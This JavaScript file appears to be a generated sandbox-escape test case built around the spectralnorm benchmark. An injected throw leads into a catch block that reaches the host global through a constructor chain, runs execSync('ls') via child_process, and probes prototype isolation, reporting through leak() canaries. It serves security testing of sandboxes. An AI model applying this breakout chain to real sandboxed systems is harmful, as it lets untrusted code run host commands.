try {
    function A(i, j) {
        let REPLACER = 23;
        return 1 / ((i + j) * (i + j + 1) / 2 + i + 1);
    }
    function Au(u, v) {
        let REPLACER = 23;
        for (var i = 0; i < u.length; ++i) {
            var t = 0;
            for (var j = 0; j < u.length; ++j)
                t += A(i, j) * u[j];
            v[i] = t;
        }
    }
    function Atu(u, v) {
        throw () => {
            return () => {
            };
        };
        for (var i = 0; i < u.length; ++i) {
            var t = 0;
            for (var j = 0; j < u.length; ++j)
                t += A(j, i) * u[j];
            v[i] = t;
        }
    }
    function AtAu(u, v, w) {
        Au(u, w);
        Atu(w, v);
    }
    function spectralnorm(n) {
        var i, u = [], v = [], w = [], vv = 0, vBv = 0;
        for (i = 0; i < n; ++i) {
            u[i] = 1;
            v[i] = w[i] = 0;
        }
        for (i = 0; i < 10; ++i) {
            AtAu(u, v, w);
            AtAu(v, u, w);
        }
        for (i = 0; i < n; ++i) {
            vBv += u[i] * v[i];
            vv += v[i] * v[i];
        }
        return Math.sqrt(vBv / vv);
    }
    var total = 0;
    for (var i = 6; i <= 48; i *= 2) {
        total += spectralnorm(i);
    }
    var expected = 5.086694231303284;
    if (total != expected)
        throw 'ERROR: bad result: expected ' + expected + ' but got ' + total;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}